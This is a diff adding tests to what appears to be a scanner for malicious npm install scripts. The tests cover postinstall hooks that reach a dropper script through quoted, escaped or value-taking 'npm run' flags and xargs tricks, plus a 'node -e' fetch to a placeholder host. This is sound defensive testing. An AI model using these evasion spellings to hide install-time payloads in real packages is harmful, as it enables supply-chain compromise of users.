@@ -343,3 +343,77 @@ describe("the flags a command may carry are read in linear time", () => {
     expect(performance.now() - started).toBeLessThan(100);
   });
 });
+
+describe("an install script's `npm run` is followed through quoted, escaped and value-taking flags", () => {
+  // npm 11.19.1 runs `payload` and its pre and post scripts for every spelling here (#16 review threads)
+  for (const cmd of [
+    "npm '--silent' run payload",
+    'npm run "-s" payload',
+    "npm run '-s' payload",
+    'npm run "--silent" payload',
+    'npm "--ignore-scripts" run payload',
+    "npm run \\payload",
+    'npm run ""payload',
+    "npm --prefix . run payload",
+    "npm run --prefix . payload",
+    "npm run -w pkg payload",
+    "npm --loglevel warn run payload",
+    "yarn '--silent' payload",
+    "pnpm run '-s' payload",
+    "bun run '--silent' payload",
+  ]) {
+    test(`postinstall: ${cmd}`, () => {
+      const r = scoreOf({ scripts: { postinstall: cmd, payload: DROPPER } }, {});
+
+      expect(r.ids).toContain("install-download");
+      expect(r.score).toBeLessThan(SCORE_FLOOR);
+    });
+  }
+
+  for (const cmd of ["npm run 'a b'", "npm run --silent 'a b'", 'npm run "a b"']) {
+    test(`a quoted name with a space: ${cmd}`, () => {
+      const r = scoreOf({ scripts: { postinstall: cmd, "a b": DROPPER } }, {});
+
+      expect(r.ids).toContain("install-download");
+      expect(r.score).toBeLessThan(SCORE_FLOOR);
+    });
+  }
+
+  // a flag that takes a value swallows the --ignore-scripts after it, and xargs adds words apm cannot see, so npm may
+  // still run the pre and post scripts
+  for (const cmd of ["npm run --registry --ignore-scripts payload", "echo --no-ig | xargs npm run --ignore-scripts payload"]) {
+    test(`${cmd}: its pre and post scripts too`, () => {
+      const scripts = { postinstall: cmd, prepayload: "true", payload: "true", postpayload: DROPPER };
+
+      expect(expandHooks({ scripts })[0]?.scripts.toSorted()).toEqual(["postinstall", "prepayload", "payload", "postpayload"].toSorted());
+      expect(scoreOf({ scripts }, {}).ids).toContain("install-download");
+    });
+  }
+
+  test("a script of many quoted runs is read in linear time", () => {
+    const cmd = "npm run '-s' payload; ".repeat(20_000);
+    const started = performance.now();
+
+    expect(expandHooks({ scripts: { postinstall: cmd, payload: "true" } })[0]?.scripts).toContain("payload");
+    expect(performance.now() - started).toBeLessThan(500);
+  });
+});
+
+describe("node's inline-eval flag is recognised after a flag whose value is the next word", () => {
+  const code = "\"require('https').get('https://example.invalid/x')\"";
+  const plain = scoreOf({ scripts: { postinstall: `node -e ${code}` } }, {});
+
+  for (const cmd of [`node --conditions dev -e ${code}`, `node --redirect-warnings file -e ${code}`, `node -r ./x.js -e ${code}`, `node "--conditions" "dev" "-e" ${code}`]) {
+    test(cmd.slice(0, 40), () => {
+      const r = scoreOf({ scripts: { postinstall: cmd } }, {});
+
+      expect(r.ids).toContain("install-download");
+      expect(r.score).toBe(plain.score);
+    });
+  }
+
+  test("a program's own arguments after its path are not node's", () => {
+    expect(isInlineDownload("node install.js -e https")).toBe(false);
+  });
+});
+
